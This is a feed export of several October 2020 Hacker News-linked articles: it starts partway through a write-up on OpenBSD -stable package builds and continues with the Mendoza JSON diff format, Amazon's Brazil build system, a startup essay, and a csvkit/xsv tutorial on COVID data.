[...40 results hidden for readability...]
editors/vim,no_x11,ruby
editors/vim,no_x11,ruby,-lang
editors/vim,no_x11,ruby,-main
</code></pre>

<p>Once we gathered all the pkgpaths to build and stored them in a
file, next step can start.</p>

<h3 id="preparingtheenvironment">Preparing the environment</h3>

<p>As the compilation is done on the real system (using PORTS_PRIVSEP
though) and not in a chroot we need to clean all packages installed
except the minimum required for the build infrastructure, which are
rsync and sqlports.</p>

<p><code>dpb(1)</code> can‚Äôt be used because it didn‚Äôt gave good results for
building the delta of the packages between release and stable.</p>

<p>The various temporary directories used by the ports infrastructure
are cleaned to be sure the build starts in a clean environment.</p>

<h3 id="compilingandcreatingthepackages">Compiling and creating the packages</h3>

<p>This step is really simple. The ports infrastructure is used
to build the packages list we produced at step 2.</p>

<pre><code>env SUBDIRLIST=package_list BULK=yes make package
</code></pre>

<p>In the script there is some code to manage the logs of the previous
batch but there is nothing more.</p>

<p>Every new run of the process will pass over all the packages which
received a commit, but the ports infrastructure is smart enough to
avoid rebuilding ports which already have a package with the correct
version.</p>

<h3 id="transferthepackagetothesigningteam">Transfer the package to the signing team</h3>

<p>Once the packages are built, we need to pass only the built
packages to the person who will manually sign the packages before
publishing them and have the mirrors to sync.</p>

<p>From the package list, the package file lists are generated and
reused by rsync to only copy the packages generated.</p>

<pre><code>env SUBDIRLIST=package_list show=PKGNAMES make | grep -v "^=" | \
      grep ^. | tr ' ' '\n' | sed 's,$,\.tgz,' | sort -u
</code></pre>

<p><strong>The system has all the -release packages in
<code>${PACKAGE_REPOSITORY}/${MACHINE_ARCH}/all/</code> (like
<code>/usr/ports/packages/amd64/all</code>) to avoid rebuilding all dependencies
required for building a package update, thus we can‚Äôt copy all the
packages from the directory where the packages are moved after
compilation.</strong></p>

<h3 id="sendanotification">Send a notification</h3>

<p>Last step is to send an email with the output of rsync to send an
email telling which machine built which package to tell the people
signing the packages that some packages are available.</p>

<p>As this process is done on each machine and that they
don‚Äôt necessarily build the same packages (no firefox on sparc64)
and they don‚Äôt build at the same speed (arm64 is slower), mails
from the four machines could arrive at very different time, which
led to a small design change.</p>

<p>The whole process is automatic from building to delivering the
packages for signature. The signature step requires a human to be
done though, but this is the price for security and privilege
separation.</p>

<h2 id="currentdesign">Current design</h2>

<p>In the original design, all the servers were running their separate
cron job, updating their own cvs ports tree and doing a very long
cvs diff. The result was working but not very practical for the
people signing who were receiving mails from each machine for each
batch.</p>

<p>The new design only changed one thing: One machine was chosen to
run the cron job, produce the package list and then will copy that
list to the other machines which update their ports tree and run
the build. Once all machines finished to build, the initiator machine
will gather outputs and send an unique mail with a summary of each
machine. This became easier to compare the output of each architecture
and once you receive the email this means every machine finished
their job and the signing can be done.</p>

<p>Having the summary of all the building machines resulted in another
improvement: In the logic of the script, it is possible to send an
email telling absolutely no package has been built while the process
was triggered, which means, something went wrong. From here, I
need to check the logs to understand why the last commit didn‚Äôt
produce a package. This can be failures like a <strong>distinfo</strong> file
update forgotten in the commit.</p>

<p>Also, this permitted fixing one issue: As the distfiles are shared
through a common NFS mount point, if multiples machines try to fetch
a distfile at the same time, both will fail to build. Now, the
initiator machine will download all the required distfiles before
starting the build on every node.</p>

<p>All of the previous scripts were reused, except the one
sending the email which had to be rewritten.</p>


</article>

</div></div>]]>
            </description>
            <link>https://dataswamp.org/~solene/2020-10-29-official-openbsd-stable-architecture.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943808</guid>
            <pubDate>Fri, 30 Oct 2020 16:19:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mendoza: Use stack machines to compute efficient JSON diffs]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 33 (<a href="https://news.ycombinator.com/item?id=24943775">thread link</a>) | @evenw
<br/>
October 30, 2020 | https://www.sanity.io/blog/mendoza | <a href="https://web.archive.org/web/*/https://www.sanity.io/blog/mendoza">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>When we started work on the recently released feature <a href="https://www.sanity.io/blog/review-changes">Review Changes</a>, we needed a way to keep a significant part of the edit history of a document in the browser memory to be able to respond quickly to different user interface states. As the user picked various document versions to compare we wanted to be able to quickly reconstruct a specific section of the history of a document. </p><figure><div role="button"><div data-has-aspect="false"></div></div><figcaption>Review Changes for Sanity Studio. Powered by Mendoza.</figcaption></figure><p>For text diffs, we use the <a href="https://github.com/google/diff-match-patch">diff-match-patch format</a>, and we just assumed someone would have implemented a similarly efficient and compact diff format for JSON documents, but no such luck. If we wanted a general JSON diff format that was super compact and fast to apply, we would have to invent it ourselves. And thus, Mendoza, the totally non-human readable diff format for structured JSON documents, was born.</p><p>Mendoza is:</p><ul><li>Lightweight JSON format</li><li>A flexible format that can accommodate more advanced encodings in the future</li><li>As a Go library for encoding and decoding</li><li>A JavaScript library for decoding</li><li>Efficient handling of the renaming of fields</li><li>Efficient handling of reordering of arrays</li><li>Not designed to be human-readable</li></ul><p>Mendoza differs (hah!) from normal diffs as they are:</p><ul><li>Made for humans to read and understand and based on simple operations (like keep, insert, and delete text)</li><li>Possible to apply even if the source has changed a bit by including some of the contexts around every part that has changed</li><li>Designed for text, and not structured documents</li></ul><p>Now, this is great when you are collaborating with humans on code development and use something like git to track your changes. What it isn√¢‚Ç¨‚Ñ¢t great for, however, is expressing differences between structured documents (such as JSON) in a compact manner that can be efficiently transferred over the network and parsed in JavaScript inside of browsers.</p><div data-block-key="27e85758c59a"><h2><a id="most-diffs-arent-meant-for-machines-27e85758c59a"></a><a href="#most-diffs-arent-meant-for-machines-27e85758c59a"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 24"><path d="M0 0h24v24H0z" fill="none"></path><path fill="currentColor" d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a>Most diffs aren't meant for machines</h2></div><p>Most diff formats are made to be human-readable. Take these two documents, where a key and the array have some changes between them:</p><p>If these where two commits, the Git diff between them would be expressed like this:</p><p>This makes it somewhat practical for humans to understand what is going on when the latter change is applied. But as you can see, in terms of pure data, there is a lot of repetition going on. and expressing all changes with only plusses and minuses isn't very efficient.</p><p>The same diff with Mendoza is expressed like this:</p><p>Mendoza constructs a minimal recipe for transforming a document into another. All it really does is to compare two JSON documents and figure out the most minimal way to express their difference as strings and integers in an array. You can use this difference to reconstruct the first document to the other.</p><div data-block-key="308db67aa205"><h2><a id="how-to-read-a-mendoza-patch-even-though-you-shouldnt-308db67aa205"></a><a href="#how-to-read-a-mendoza-patch-even-though-you-shouldnt-308db67aa205"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 24"><path d="M0 0h24v24H0z" fill="none"></path><path fill="currentColor" d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a>How to read a Mendoza patch (even though you shouldn't)</h2></div><p>A Mendoza patch consists of an array of integers and strings. The integers are <em>opcodes</em> (short for √¢‚Ç¨≈ìoperation codes√¢‚Ç¨ÔøΩ), 8-bit numbers that correspond to an operation. Opcodes take parameters as strings, positive numbers, or JSON values (that is: the actual data that is changing). The list of available opcodes is as follows, notice that 10-18 are composites of the preceding ones:</p><ul><li>0 <code>Value<!-- -->√¢‚Ç¨‚Äπ </code></li><li>1 <code>Copy<!-- -->√¢‚Ç¨‚Äπ </code></li><li>2 <code>Blank<!-- -->√¢‚Ç¨‚Äπ</code></li><li>3 <code>ReturnIntoArray<!-- -->√¢‚Ç¨‚Äπ </code></li><li>4 <code>ReturnIntoObject<!-- -->√¢‚Ç¨‚Äπ </code></li><li>5 <code>ReturnIntoObjectSameKey<!-- -->√¢‚Ç¨‚Äπ </code></li><li>6 <code>PushField<!-- -->√¢‚Ç¨‚Äπ </code></li><li>7 <code>PushElement<!-- -->√¢‚Ç¨‚Äπ </code></li><li>8 <code>PushParent<!-- -->√¢‚Ç¨‚Äπ </code></li><li>9 <code>Pop<!-- -->√¢‚Ç¨‚Äπ </code></li><li>10 <code>PushFieldCopy</code></li><li>11 <code>PushFieldBlank</code></li><li>12 <code>PushElementCopy</code></li><li>13 <code>PushFieldBlank</code></li><li>14 <code>ReturnIntoObjectPop</code></li><li>15 <code>ReturnIntoObjectSameKeyPop</code></li><li>16 <code>ReturnIntoArrayPop</code></li><li>17 <code>ObjectSetFieldValue</code></li><li>18 <code>ObjectCopyField</code></li><li>19 <code>ObjectDeleteField</code>√¢‚Ç¨‚Äπ </li><li>20 <code>ArrayAppendValue</code>√¢‚Ç¨‚Äπ </li><li>21 <code>ArrayAppendSlice<!-- -->√¢‚Ç¨‚Äπ</code></li><li>22 <code>StringAppendString<!-- -->√¢‚Ç¨‚Äπ</code></li></ul><p>Mendoza reads these opcodes from the patch and produces the resulting document from them. Depending on the patch, Mendoza might choose not to strictly follow the opcodes but take a simpler path. If every field and value has changed, for example, it√¢‚Ç¨‚Ñ¢s more efficient just to replace the whole document with the new data without going through all the operations. Or if you have a list of objects where one has moved to another position and changed a key-value, Mendoza will manage to go back to the original and represent the change in a cheap way.</p><p>Mendoza is implemented in Go and can be found in this <a href="https://github.com/sanity-io/mendoza">GitHub repository</a>. We have also made <a href="https://github.com/sanity-io/mendoza-js">a parser for Mendoza patches in JavaScript</a>, that you can use in your own application. </p><p>Of course, you can dive into <a href="https://github.com/sanity-io/sanity/blob/a3f7158016d63728a9b435e6ab444ff2b90fd424/packages/%40sanity/desk-tool/src/panes/documentPane/documentHistory/history/timeline.ts#L421">the source code for the Sanity Studio</a> and explore how Mendoza is used there. If you want a slightly simpler use-case, you can also <a href="https://github.com/sanity-io/groq-store/blob/main/src/patch.ts">check out how we√¢‚Ç¨‚Ñ¢re using Mendoza to simulate a part of Sanity√¢‚Ç¨‚Ñ¢s real-time datastore</a> in the browser to power the <a href="https://github.com/sanity-io/next-sanity">real-time preview for Next.js</a>. </p><p>Naming a project is always difficult. Since this project is focused on representing changes between <em>JSON</em> documents I naturally started thinking about names like "JSON differ, JSON changes, JSON patch, √¢‚Ç¨¬¶". However, most of these names have already been used by existing projects. While I was muttering "JSON, JSON, JSON" it suddenly turned into "JSON, JSON, Jason, Jason Mendoza".</p><p>Jason Mendoza is a character from the show The Good Place, and while this project has little in common with the stupidest DJ from Florida, at least it's short and catchy.</p><p>Since a Mendoza patch is just describing the effect of a change it is also limited to work for the documents it was based on. It doesn√¢‚Ç¨‚Ñ¢t come with guarantees for consistency if the document you apply it on has changed from the original in meanwhile. This is one of the tradeoffs that we needed to do to make it really compressed. </p></div></div></div>]]>
            </description>
            <link>https://www.sanity.io/blog/mendoza</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943775</guid>
            <pubDate>Fri, 30 Oct 2020 16:15:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pondering Amazon's Manyrepo Build System]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24943737">thread link</a>) | @nephics
<br/>
October 30, 2020 | http://beza1e1.tuxen.de/amazon_manyrepo_builds.html | <a href="https://web.archive.org/web/*/http://beza1e1.tuxen.de/amazon_manyrepo_builds.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>A while ago,
<a href="http://beza1e1.tuxen.de/monorepo_vcs.html">I pondered monorepo version control systems</a>.
This article is at the opposite end of the spectrum: Manyrepos.</p>
<h2>Why Manyrepo?</h2>
<p>Monorepos are alluring since Google, Facebook, and Microsoft use that approach.
Is that a part of their secret sauce or accidental?
There is another big tech company which does the opposite.
At Amazon, teams work more independently.
Some use different version control systems which are not git
like Subversion and Perforce.
I guess that most companies do <em>not</em> have a monorepo
because it is really easy to split of a separate project
but hard to merge them just from an organizational point of view.
So maybe we can learn more from Amazon than Google?</p>
<p>A common pattern is that Amazon like the others built its own infrastructure
and engineers love it and miss it after they leave.</p>
<blockquote>
<p>I've heard descriptions and seen blog entries about many other large companies build systems, but to be honest, nothing even comes close to the amazing technology Amazon has produced.
I would probably argue that what Google, Facebook, and most other companies of comparable size and larger do is at best objectively less good and at worst wasting millions of dollars of lost productivity.
‚Äì<a href="https://gist.github.com/terabyte/15a2d3d407285b8b5a0a7964dd6283b0">terabyte</a></p>
<p>Once you understand the build and deployment tools you first wonder how you ever did anything before and then start to fear how you'll do anything once you leave.
‚Äì<a href="https://gist.github.com/terabyte/15a2d3d407285b8b5a0a7964dd6283b0#gistcomment-3356000">hohle</a></p>
</blockquote>
<p>Just like Ex-Googlers reinvented their build system on the outside
with <a href="https://www.pantsbuild.org/docs">Pants</a>
and <a href="https://buck.build/">Buck</a>.
Likewise <a href="https://qbtbuildtool.com/">QBT</a> reinvents the Amazon build system.
Unfortunately, QBT is less known and less mature.</p>
<h2>Amazon's Build System</h2>
<p>There is less information about Amazon unfortunately.
Mine is from <a href="https://gist.github.com/terabyte/15a2d3d407285b8b5a0a7964dd6283b0">this gist</a>
and discussions on 
<a href="https://news.ycombinator.com/item?id=24722214">HN</a> and
<a href="https://lobste.rs/s/ykk54d/amazon_s_build_system">lobste.rs</a>.
If I got something wrong, please tell me.
The short version is that Amazon's "Brazil" tool is
more of a package system than a build system.
It is closer to Nix than to Bazel.</p>
<p><a href="https://gist.github.com/terabyte/15a2d3d407285b8b5a0a7964dd6283b0#gistcomment-3356000">Brazil delegates the actual build process to language-specific tools</a>.
Tools, like tmux, are also packaged with Brazil.
The interesting part is how packages are managed
and the core concept to understand is <em>version set</em>.</p>
<p>If you create a package at Amazon,
you specify an <em>interface version</em> like "1.1".
As long as changes are backwards-compatible,
the interface version is not changed.
When Brazil builds a package,
it appends an additional number to turn it into a <em>build version</em>
like "1.1.3847523".
You can only specify dependencies on interface versions.</p>
<p>Another thing Brazil does when building a package
is to record the transitive closure of dependencies
with their build versions.
Modern packaging tools differ between
"dependencies you want"
and "dependencies you actually used".
For example, <a href="https://doc.rust-lang.org/cargo/guide/cargo-toml-vs-cargo-lock.html">Cargo.toml and Cargo.lock in Rust</a>.</p>
<p>A <em>version set</em> is a collection of packages.
The "live" package is the special global one
which corresponds to a trunk branch in version control.
When you build a package "against" a version set,
the tests of all packages in the version set are executed,
and the version set is incremented.
Thus the individual package is updated
(or published if it was not part of the version set before).</p>
<p>Brazil dependencies are classified as runtime, build, and test dependencies.
So for deployment, it can strip everything but the runtime dependencies
from a version set.</p>
<p>Dependencies must be carefully managed in this environment
as a "dependency hell" scenario is possible.</p>
<blockquote>
<p>One of the biggest ways that brazil was misused was around handling of major versions [aka interface version].
For context, only a single major version of a package is allowed to exist in a versionset at a time. If you tried to merge in a different major version of a package into your versionset, your pipeline would fail to build due to "Major version conflicts". One of the biggest sins was around bumping the major versions of the dependencies in a library without bumping the major version of that library at the same time. This would lead to many broken pipelines. Let's say you have a library Foo-1.0 with a bunch of users on other teams. You decide to bump up the Guava version from 25 to 29 and publish the new version of Foo-1.0. Anyone consuming Foo-1.0 would automatically pick up the new version of that lib because it's just a minor version change, however the merge would fail with a "major version conflict" because the major version of Guava they're using in their versionset is still 25. This means you would either have to pin that library back at a previous version, or bump your dependency on Guava in all of you packages to 29.
‚Äì<a href="https://news.ycombinator.com/item?id=24731537">pentlander</a></p>
</blockquote>
<p>This is an insight that generalizes:
Updating a dependency major version is a breaking change
even if your API is stable.</p>
<h2>The Point?</h2>
<p>Overall, it sounds a lot like a distribution package manager like apt or Nix.
The difference of version sets is
that they provide a branching mechanism
and this is how teams can work independently.
How is that unique though?
You can fork with apt and Nix as well.
In a monorepo, it would be a branch.
It must be about something different.</p>
<p>One advantage of monorepos is that one can track all users.
Version sets in Brazil provide a similar mechanism
since it is a <em>central</em> database.
This is important in case of security updates, for example.
Unfortunately, in manyrepo environments this information is usually not available
and when an issue arise it must be arduously researched.
So maybe companies should build such infrastructure
instead of dreaming about monorepos?</p>
<p>Coming back to the advantage of manyrepos,
refering to Amazon we can describe it concretely:
Version sets allow you to use multiple interface versions of the same package
at once (not multiple build versions though).
This mixture is not technically possible with a git monorepo
(but with Subversion or Perforce).
This is at least one example of the general tradeoff.</p>
<blockquote>
<p>I don‚Äôt really think there‚Äôs a better or worse between the Amazon and Google/FB style build/deploy/source control systems, it‚Äôs primarily a reflection of the org/team structure and what they prioritize - there‚Äôs tension between team independence/velocity and crosscutting changes that optimize the whole codebase.
‚Äì<a href="https://lobste.rs/s/ykk54d/amazon_s_build_system#c_fzyzg6">revert</a></p>
</blockquote>
<p>I would like to see more discussion online about this.
Many companies should value the team independence over the crosscutting changes.
So the question is:
How to get the advantages we currently uniquely attribute to monorepos
in a manyrepo setting?
Amazon's Brazil has valuable ideas to contribute
and should be more widely known.</p>

</article><p>Amazon's build system provides valuable insights for manyrepo environments.</p></div>]]>
            </description>
            <link>http://beza1e1.tuxen.de/amazon_manyrepo_builds.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943737</guid>
            <pubDate>Fri, 30 Oct 2020 16:12:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Useless Inventions:Is Your Product a Solution in Search of a Problem?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943717">thread link</a>) | @rjyoungling
<br/>
October 30, 2020 | https://www.younglingfeynman.com/essays/uselessinventions | <a href="https://web.archive.org/web/*/https://www.younglingfeynman.com/essays/uselessinventions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-ba977392c5ff62ef784f"><div><p>In Japanese, there‚Äôs a word for that‚Ä¶</p><blockquote><p><a href="https://en.wikipedia.org/wiki/Chind%C5%8Dgu" target="_blank">‚ÄúChind≈çgu</a> (ÁèçÈÅìÂÖ∑) originated in Japan and is characterized by the invention of ingenious everyday gadgets that seem to be ideal solutions to particular problems, but which, in fact, cause more problems than they solve.‚Äù</p></blockquote></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604071674616_51027"><div><p>Even though chind≈çgu (which translates to strange tools), is more about making people laugh at the inventions that create more problems than they solve, I can't help but wince.</p><p>Aren't we guilty of that often?<br></p><p>There are voices that promote this approach but for most of us, it's a recipe for disaster. [1] It's just much easier to start with a lock and build a key than to create a key and then go into the world in search of a lock that it can open. [2]</p><p>If you start with the solution, you'll struggle with:</p><ol data-rte-list="default"><li><p>Finding the problem that it solves</p></li><li><p>Finding the people who have that problem.</p></li><li><p>Finding a group of people for whom that problem is actually a REAL problem.</p></li><li><p>Finding the people in the intersection between ‚Äúit‚Äôs a real problem‚Äù and ‚ÄúI‚Äôll pay for your solution.‚Äù</p></li></ol><p>Instead, if you want to maximize the probability of success, start with one of the following approaches:</p><ol data-rte-list="default"><li><p><strong>AUDIENCE-FIRST:</strong> Pick a tiny audience (&lt;10 people), and identify a problem that they have. Keep iterating problems and solutions until you've stumbled onto something that makes them say WOW!! instead of eh‚Ä¶ [3] E.g. <a href="https://medium.com/@rrhoover/building-a-startup-build-an-audience-first-9fbba4f1fa15" target="_blank">Ryan Hoover with Product Hunt</a>.</p></li><li><p><strong>PROBLEM-FIRST:</strong> Notice a problem you have in your own life, then build something that solves it. That way you know for sure it's not an imaginary problem and you have a user that can help you iterate (you). E.g. Wozniak with the Apple I. <a href="https://www.younglingfeynman.com/essays/airbnb2?rq=wozniak" target="_blank"><em>More on that here</em></a><em>.</em></p></li><li><p><strong>NEEDS-BASED: </strong>Create something you just really want to see in the world. So the problem it solves for you is just, I want this and it doesn't exist. I'm not the biggest fan of this approach in general but it can work. E.g. Jack Dorsey with Twitter.</p></li></ol><p><em>[1] From </em><a href="https://www.younglingfeynman.com/essays/2019/3/8/start-with-the-who-or-with-the-what?rq=andy" target="_blank"><em>Start With The Who Or With The What?</em></a></p><blockquote><p><em>"‚Ä¶And Andy Rachleff (Benchmark Capital, Wealthfront) is of the mind that you should change the who, not the what. Starting with the market, leads to common and uninteresting problems, but if you start with the what, then you can find the right people."</em></p></blockquote></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604071674616_53117"><div><p><em>[2] Even worse is that most of us often build the most expensive, overengineered key. We build some perfect product with tons of infrastructure in anticipation of the immediate exponential growth we‚Äôll get when we launch. But when it turns out the dogs aren‚Äôt eating the dog food, those resources are wasted. More on this in </em><a href="https://www.younglingfeynman.com/essays/paradigm?rq=success" target="_blank"><em>Paradigm Shift: Drastically Increase The Odds of Success</em></a><em>.</em></p><p><em>[3] More on that in </em><a href="https://www.younglingfeynman.com/essays/livewithout" target="_blank"><em>Create A Product That‚Äôs Hard To Live Without</em></a><em>. I disagree with the notion that it needs to be a "hair on fire problem." The hypothesis that you need to sell painkillers not vitamins seems plausible as a metaphor but empirically it doesn't pan out. There are tons of successful founders that solved something that was just an annoyance for their customers. Just focus on making something they love so much that it's hard to live without.</em></p></div></div></div>]]>
            </description>
            <link>https://www.younglingfeynman.com/essays/uselessinventions</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943717</guid>
            <pubDate>Fri, 30 Oct 2020 16:10:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[XSV is killing it when cleaning CSV data]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24943696">thread link</a>) | @ethink
<br/>
October 30, 2020 | https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line | <a href="https://web.archive.org/web/*/https://www.ezzeddinabdullah.com/posts/how-to-clean-csv-data-at-the-command-line">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><figure><p><img src="https://uploads-ssl.webflow.com/5f359c073455c743bc873ee4/5f94930788d137b29665878b_clean-csv.jpg" loading="lazy" alt=""></p><figcaption>Photo by <a href="https://unsplash.com/@cdc?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">CDC</a> on <a href="https://unsplash.com/s/photos/covid?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></figcaption></figure><p>Have you ever dealt with a big-scary CSV file that has many columns that you don‚Äôt want and many records that slow down the process for you to filter and get the desired information? </p><p>This tutorial is about using two command-line programs that can solve these problems; <a href="https://csvkit.readthedocs.io/en/latest/" target="_blank">csvkit</a> and <a href="https://github.com/BurntSushi/xsv" target="_blank">xsv</a>. We will compare the two at the end and see how performant each and when we can use one and not the other in terms of speed especially if we‚Äôre processing a large CSV file. In the last blog post, we talked about <a href="https://www.ezzeddinabdullah.com/posts/how-to-clean-text-data-at-the-command-line" target="_blank">how to clean text data at the command line</a> that I recommend to have a look at.</p><h2>Downloading COVID&nbsp;data from covidtracking</h2><p>Let's first download recent coronavirus data across the United States from <a href="https://covidtracking.com/data/download">COVID Tracking Project</a> which is a volunteer organization dedicated to collecting and publishing the data required to understand the COVID-19 outbreak in the US. Btw, The data is published under a <a href="https://creativecommons.org/licenses/by/4.0/">Creative Commons CC BY 4.0</a> license.</p><p>Let's do this by downloading the <a href="https://covidtracking.com/data/download/all-states-history.csv">CSV&nbsp;file manually</a> or using <em>curl</em>:</p><div><pre>$ curl -LO https://covidtracking.com/data/download/all-states-history.csv
</pre></div><p><strong>-LO </strong>is a combination of <strong>-L&nbsp;</strong>and <strong>-O</strong></p><ul role="list"><li><strong>-L </strong>is used to make sure if the URL&nbsp;has changed to another location, <em>curl</em> will redo the request on the new redirection link</li><li><strong>-O </strong>this option is used to create an output file of the same name of the requested file name which is <strong>all-states-history.csv </strong>here</li></ul><h2>Printing the CSV&nbsp;file headers</h2><p>Let's first print what column names we have for this <em>all-states.history.csv </em>file:</p><div><pre>$ csvcut -n all-states-history.csv 
  1: date
  2: state
  3: dataQualityGrade
  4: death
  5: deathConfirmed
  6: deathIncrease
  7: deathProbable
  8: hospitalized
  9: hospitalizedCumulative
 10: hospitalizedCurrently
 11: hospitalizedIncrease
 12: inIcuCumulative
 13: inIcuCurrently
 14: negative
 15: negativeIncrease
 16: negativeTestsAntibody
 17: negativeTestsPeopleAntibody
 18: negativeTestsViral
 19: onVentilatorCumulative
 20: onVentilatorCurrently
 21: pending
 22: positive
 23: positiveCasesViral
 24: positiveIncrease
 25: positiveScore
 26: positiveTestsAntibody
 27: positiveTestsAntigen
 28: positiveTestsPeopleAntibody
 29: positiveTestsPeopleAntigen
 30: positiveTestsViral
 31: recovered
 32: totalTestEncountersViral
 33: totalTestEncountersViralIncrease
 34: totalTestResults
 35: totalTestResultsIncrease
 36: totalTestsAntibody
 37: totalTestsAntigen
 38: totalTestsPeopleAntibody
 39: totalTestsPeopleAntigen
 40: totalTestsPeopleViral
 41: totalTestsPeopleViralIncrease
 42: totalTestsViral
 43: totalTestsViralIncrease
</pre></div><p>As you can see, using <strong>csvcut </strong>with the option <strong>-n </strong>can list all the headers we have with their associated order which can help us select some specific columns that we're interested in.</p><h2>Selecting specific columns</h2><p>In this tutorial, we're interested in four columns and these are their descriptions as reported by the COVID&nbsp;Tracking&nbsp;Project:</p><ol start="1" role="list"><li>data:&nbsp;Date on which data was collected by The COVID Tracking Project.</li><li>state: Two-letter abbreviation for the state or territory.</li><li>positive: Total number of <strong>confirmed plus probable cases</strong> of COVID-19 reported by the state or territory</li><li>death:&nbsp;Total <strong>fatalities with confirmed OR probable COVID-19 case diagnosis</strong><br></li></ol><p>Let's see how we can get the first 10 lines of these 4 columns in our CSV&nbsp;file at the command line:</p><div><pre>$ csvcut -c date,state,positive,death all-states-history.csv | head | csvlook 
|       date | state | positive |  death |
| ---------- | ----- | -------- | ------ |
| 2020-10-26 | AK    |   14,413 |     68 |
| 2020-10-26 | AL    |  185,322 |  2,866 |
| 2020-10-26 | AR    |  106,727 |  1,833 |
| 2020-10-26 | AS    |        0 |      0 |
| 2020-10-26 | AZ    |  238,964 |  5,875 |
| 2020-10-26 | CA    |  901,010 | 17,357 |
| 2020-10-26 | CO    |   95,089 |  2,076 |
| 2020-10-26 | CT    |   68,099 |  4,589 |
| 2020-10-26 | DC    |   16,812 |    642 |
</pre></div><p>So <strong>csvcut </strong>with the option <strong>-c </strong>is used here to select the upcoming columns separated by commas. These 10 lines look better aligned with <strong>csvlook</strong></p><p>Note that we could've done that with either of the following commands:</p><div><pre>$ csvcut -c 1,2,22,4 all-states-history.csv | csvgrep -c state -m CA |head | csvlook
$ csvcut -c 1-2,22,4 all-states-history.csv | csvgrep -c state -m CA |head | csvlook
$ csvcut -c 1-2,positive,4 all-states-history.csv | csvgrep -c state -m CA |head | csvlook
</pre></div><p>Meaning you can select the columns with their numbers or ranges or a combination of numbers and column names as strings.</p><p>Take care that this CSV&nbsp;data may differ from yours if you're using the recent data from the COVID&nbsp;Tracking Project on another day than the day this tutorial was written.</p><h2>Filtering information</h2><p>Let's now filter out COVID&nbsp;data at California state:</p><div><pre>$ csvcut -c date,state,positive,death all-states-history.csv | csvgrep -c state -m AL | head | csvlook 
|       date | state | positive | death |
| ---------- | ----- | -------- | ----- |
| 2020-10-26 | AL    |  185,322 | 2,866 |
| 2020-10-25 | AL    |  184,355 | 2,866 |
| 2020-10-24 | AL    |  183,276 | 2,866 |
| 2020-10-23 | AL    |  180,916 | 2,859 |
| 2020-10-22 | AL    |  177,064 | 2,843 |
| 2020-10-21 | AL    |  174,528 | 2,805 |
| 2020-10-20 | AL    |  174,528 | 2,805 |
| 2020-10-19 | AL    |  173,485 | 2,789 |
| 2020-10-18 | AL    |  172,626 | 2,788 |
</pre></div><p>We used here <strong>csvgrep</strong> with the option <strong>-c </strong>to select the column that we‚Äôre filtering which is the <em>state </em>here to match <em>AL</em> using <strong>-m </strong>option that matches the pattern we search for.</p><p>I'd like to make sure of this data, so I&nbsp;went to Google and asked how many cases we have at Alabama and this is the answer:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f359c073455c743bc873ee4/5f988fc5968f41509e41fbfe_Screen%20Shot%202020-10-27%20at%2011.22.07%20PM.png" loading="lazy" alt=""></p><figcaption>Image by the Author</figcaption></figure><p>Looks like the data reported by the COVID Tracking Project is close to what Google is reporting having 186K positive cases and 2892 fatalities.</p><p>If you also put another column to show the increase in the positive cases from the previous day, you'd find:</p><div><pre>$ csvcut -c date,state,positive,24,death all-states-history.csv | csvgrep -c state -m AL | head | csvlook
|       date | state | positive | positiveIncrease | death |
| ---------- | ----- | -------- | ---------------- | ----- |
| 2020-10-26 | AL    |  185,322 |              967 | 2,866 |
| 2020-10-25 | AL    |  184,355 |            1,079 | 2,866 |
| 2020-10-24 | AL    |  183,276 |            2,360 | 2,866 |
| 2020-10-23 | AL    |  180,916 |            3,852 | 2,859 |
| 2020-10-22 | AL    |  177,064 |            2,536 | 2,843 |
| 2020-10-21 | AL    |  174,528 |                0 | 2,805 |
| 2020-10-20 | AL    |  174,528 |            1,043 | 2,805 |
| 2020-10-19 | AL    |  173,485 |              859 | 2,789 |
| 2020-10-18 | AL    |  172,626 |              964 | 2,788 |
